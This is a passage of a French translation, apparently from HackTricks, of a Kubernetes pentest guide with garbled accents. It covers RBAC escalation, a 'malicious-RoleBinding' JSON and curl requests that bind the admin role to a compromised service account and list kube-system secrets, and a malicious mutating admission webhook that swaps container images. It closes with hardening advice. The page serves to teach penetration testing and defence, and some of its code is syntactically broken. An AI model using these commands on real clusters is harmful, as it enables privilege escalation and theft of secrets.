Kubernetes dispose d'un [m√©canisme int√©gr√©](https://kubernetes.io/docs/reference/access-authn-authz/rbac/#privilege-escalation-prevention-and-bootstrapping) pour cela :

> L'API RBAC **emp√™che les utilisateurs d'escalader les privil√®ges** en modifiant les r√¥les ou les liens de r√¥les. √âtant donn√© que cela est appliqu√© au niveau de l'API, cela s'applique m√™me lorsque l'autorisateur RBAC n'est pas utilis√©.
>
> Un utilisateur ne peut **cr√©er/mettre √† jour un r√¥le que s'il poss√®de d√©j√† toutes les autorisations contenues dans le r√¥le**, dans la m√™me √©tendue que le r√¥le (√† l'√©chelle du cluster pour un ClusterRole, dans le m√™me espace de noms ou √† l'√©chelle du cluster pour un Role)

{% hint style="warning" %}
Il y a une exception √† la r√®gle pr√©c√©dente. Si un principal a le **verbe `escalate`** sur **`roles`** ou **`clusterroles`**, il peut augmenter les privil√®ges des r√¥les et des clusterroles m√™me s'il n'a pas les autorisations lui-m√™me.
{% endhint %}

Voyons un exemple de cette pr√©vention.

Un compte de service nomm√© _sa7_ est dans un RoleBinding _edit-role-rolebinding_. Cet objet RoleBinding a un r√¥le nomm√© _edit-role_ qui a des r√®gles de **permissions compl√®tes** sur les r√¥les. Th√©oriquement, cela signifie que le compte de service peut **modifier** **n'importe quel r√¥le** dans l'espace de noms _default_.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_roles\_roleBinding\_binding\_sa7\_to\_edit\_role.png)

![](https://www.cyberark.com/wp-content/uploads/2018/12/role\_to\_edit\_any\_role.png)

Il existe √©galement un r√¥le existant nomm√© _list-pods_. Toute personne ayant ce r√¥le peut lister tous les pods de l'espace de noms _default_. L'utilisateur _sa7_ devrait avoir les autorisations pour modifier tous les r√¥les, voyons donc ce qui se passe lorsqu'il essaie d'ajouter la ressource "secrets" aux ressources du r√¥le.

![](https://www.cyberark.com/wp-content/uploads/2018/12/edit\_role\_resources-300x66.png)

Apr√®s avoir essay√© de le faire, nous recevrons une erreur "forbidden: attempt to grant extra privileges" (Figure 31), car bien que notre utilisateur _sa7_ ait les autorisations pour mettre √† jour les r√¥les pour n'importe quelle ressource, il ne peut mettre √† jour le r√¥le que pour les ressources sur lesquelles il a des autorisations.

![](https://www.cyberark.com/wp-content/uploads/2018/12/forbidden\_attempt\_to\_gran\_extra\_privileges\_message-1024x288.png)

### **Obtenir et modifier les RoleBindings/ClusterRoleBindings**

{% hint style="danger" %}
**Apparemment, cette technique fonctionnait auparavant, mais selon mes tests, cela ne fonctionne plus pour la m√™me raison expliqu√©e dans la section pr√©c√©dente. Vous ne pouvez pas cr√©er/modifier un rolebinding pour vous donner ou donner √† un autre compte de service des privil√®ges si vous ne les avez pas d√©j√†.**
{% endhint %}

Le privil√®ge de cr√©er des Rolebindings permet √† un utilisateur de **lier des r√¥les √† un compte de service**. Ce privil√®ge peut potentiellement conduire √† une escalade des privil√®ges car il **permet √† l'utilisateur de lier des privil√®ges d'administrateur √† un compte de service compromis.**

Le ClusterRole suivant utilise le verbe sp√©cial _bind_ qui permet √† un utilisateur de cr√©er un RoleBinding avec le ClusterRole _admin_ (r√¥le √† privil√®ges √©lev√©s par d√©faut) et d'ajouter n'importe quel utilisateur, y compris lui-m√™me, √† ce ClusterRole admin.

![](https://www.cyberark.com/wp-content/uploads/2018/12/clusterRole\_with\_bind\_verb.png)

Ensuite, il est possible de cr√©er **`malicious-RoleBinging.json`**, qui **lie le r√¥le admin √† un autre compte de service compromis :**
```javascript
{
"apiVersion": "rbac.authorization.k8s.io/v1",
"kind": "RoleBinding",
"metadata": {
"name": "malicious-rolebinding",
"namespaces": "default"
},
"roleRef": {
"apiGroup": "*",
"kind": "ClusterRole",
"name": "admin"
},
"subjects": [
{
"kind": "ServiceAccount",
"name": "compromised-svc"
"namespace": "default"
}
]
}
```
Le but de ce fichier JSON est de lier l'administrateur "ClusterRole" (ligne 11) au compte de service compromis (ligne 16).

Maintenant, tout ce que nous avons √† faire est d'envoyer notre JSON en tant que requ√™te POST √† l'API en utilisant la commande CURL suivante :
```bash
curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \
-H "Content-Type: application/json" \
https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
-d @malicious-RoleBinging.json
```
Apr√®s que le r√¥le d'administrateur est li√© au compte de service "compromised-svc", nous pouvons utiliser le jeton du compte de service compromis pour **list secrets**. La commande CURL suivante permettra de le faire :
```bash
curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\
-H "Content-Type: application/json"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret
```
## Autres attaques

### Application de proxy Sidecar

Par d√©faut, il n'y a pas de chiffrement dans la communication entre les pods. L'authentification mutuelle, √† deux voies, de pod √† pod.

#### Cr√©er une application de proxy Sidecar <a href="#create-a-sidecar-proxy-app" id="create-a-sidecar-proxy-app"></a>

Cr√©ez votre fichier .yaml
```bash
kubectl run app --image=bash --command -oyaml --dry-run=client > <appName.yaml> -- sh -c 'ping google.com'
```
Modifiez votre fichier .yaml et ajoutez les lignes comment√©es :
```yaml
#apiVersion: v1
#kind: Pod
#metadata:
#  name: security-context-demo
#spec:
#  securityContext:
#    runAsUser: 1000
#    runAsGroup: 3000
#    fsGroup: 2000
#  volumes:
#  - name: sec-ctx-vol
#    emptyDir: {}
#  containers:
#  - name: sec-ctx-demo
#    image: busybox
command: [ "sh", "-c", "apt update && apt install iptables -y && iptables -L && sleep 1h" ]
securityContext:
capabilities:
add: ["NET_ADMIN"]
#   volumeMounts:
#   - name: sec-ctx-vol
#     mountPath: /data/demo
#   securityContext:
#     allowPrivilegeEscalation: true
```
Voir les journaux du proxy :
```bash
kubectl logs app -C proxy
```
Plus d'informations sur: [https://kubernetes.io/docs/tasks/configure-pod-container/security-context/](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

### Contr√¥leur d'admission malveillant

Un contr√¥leur d'admission est un morceau de code qui **intercepte les requ√™tes vers le serveur API Kubernetes** avant la persistance de l'objet, mais **apr√®s que la requ√™te soit authentifi√©e** **et autoris√©e**.

Si un attaquant parvient d'une mani√®re ou d'une autre √† **injecter un contr√¥leur d'admission de mutation**, il pourra **modifier les requ√™tes d√©j√† authentifi√©es**. Cela lui permettra potentiellement d'obtenir des privil√®ges suppl√©mentaires et, plus couramment, de persister dans le cluster.

Exemple provenant de [https://blog.rewanthtammana.com/creating-malicious-admission-controllers](https://blog.rewanthtammana.com/creating-malicious-admission-controllers):
```bash
git clone https://github.com/rewanthtammana/malicious-admission-controller-webhook-demo
cd malicious-admission-controller-webhook-demo
./deploy.sh
kubectl get po -n webhook-demo -w
```
Attendez que le serveur webhook soit pr√™t. V√©rifiez l'√©tat :
```bash
kubectl get mutatingwebhookconfigurations
kubectl get deploy,svc -n webhook-demo
```
![mutating-webhook-status-check.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433436353/yHUvUWugR.png?auto=compress,format\&format=webp)

Une fois que notre webhook de mutation malveillant est en cours d'ex√©cution, d√©ployons un nouveau pod.
```bash
kubectl run nginx --image nginx
kubectl get po -w
```
Attendez √† nouveau, jusqu'√† ce que vous voyiez le changement de statut du pod. Maintenant, vous pouvez voir l'erreur `ErrImagePull`. V√©rifiez le nom de l'image avec l'une des requ√™tes suivantes.
```bash
kubectl get po nginx -o=jsonpath='{.spec.containers[].image}{"\n"}'
kubectl describe po nginx | grep "Image: "
```
![malicious-admission-controller.PNG](https://cdn.hashnode.com/res/hashnode/image/upload/v1628433512073/leFXtgSzm.png?auto=compress,format\&format=webp)

Comme vous pouvez le voir dans l'image ci-dessus, nous avons essay√© d'ex√©cuter l'image `nginx`, mais l'image ex√©cut√©e finale est `rewanthtammana/malicious-image`. Que s'est-il pass√© !?

#### D√©tails techniques <a href="#heading-technicalities" id="heading-technicalities"></a>

Nous allons expliquer ce qui vient de se passer. Le script `./deploy.sh` que vous avez ex√©cut√© a cr√©√© un contr√¥leur d'admission de webhook de mutation. Les lignes suivantes dans le contr√¥leur d'admission de webhook de mutation sont responsables des r√©sultats ci-dessus.
```
patches = append(patches, patchOperation{
Op:    "replace",
Path:  "/spec/containers/0/image",
Value: "rewanthtammana/malicious-image",
})
```
Le passage ci-dessus remplace la premi√®re image de conteneur dans chaque pod par `rewanthtammana/malicious-image`.

## Bonnes pratiques

### **Emp√™cher le montage automatique des jetons de compte de service sur les pods**

Lorsqu'un pod est cr√©√©, il monte automatiquement un compte de service (le compte par d√©faut est le compte de service par d√©faut dans le m√™me espace de noms). Tous les pods n'ont pas besoin de pouvoir utiliser l'API depuis leur propre int√©rieur.

√Ä partir de la version 1.6+, il est possible d'emp√™cher le montage automatique des jetons de compte de service sur les pods en utilisant automountServiceAccountToken: false. Cela peut √™tre utilis√© sur les comptes de service ou les pods.

Sur un compte de service, il doit √™tre ajout√© comme ceci :\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/serviceAccount\_with\_autoamountServiceAccountToken\_false.png)

Il est √©galement possible de l'utiliser sur le pod :\\

![](https://www.cyberark.com/wp-content/uploads/2018/12/pod\_with\_autoamountServiceAccountToken\_false.png)

### **Accorder des autorisations sp√©cifiques aux RoleBindings\ClusterRoleBindings**

Lors de la cr√©ation de RoleBindings\ClusterRoleBindings, assurez-vous que seuls les utilisateurs qui ont besoin du r√¥le dans la liaison sont inclus. Il est facile d'oublier les utilisateurs qui ne sont plus pertinents dans de tels groupes.

### **Utiliser des r√¥les et des RoleBindings au lieu de ClusterRoles et ClusterRoleBindings**

Lors de l'utilisation de ClusterRoles et ClusterRoleBindings, cela s'applique √† l'ensemble du cluster. Un utilisateur dans un tel groupe a ses autorisations sur tous les espaces de noms, ce qui est parfois inutile. Les r√¥les et les RoleBindings peuvent √™tre appliqu√©s sur un espace de noms sp√©cifique et fournissent une autre couche de s√©curit√©.

### **Utiliser des outils automatis√©s**

{% embed url="https://github.com/cyberark/KubiScan" %}

{% embed url="https://github.com/aquasecurity/kube-hunter" %}

{% embed url="https://github.com/aquasecurity/kube-bench" %}

## **R√©f√©rences**

{% embed url="https://www.cyberark.com/resources/threat-research-blog/securing-kubernetes-clusters-by-eliminating-risky-permissions" %}

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-1" %}



<details>

<summary><strong>Soutenez HackTricks et b√©n√©ficiez d'avantages !</strong></summary>

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou si vous souhaitez acc√©der √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
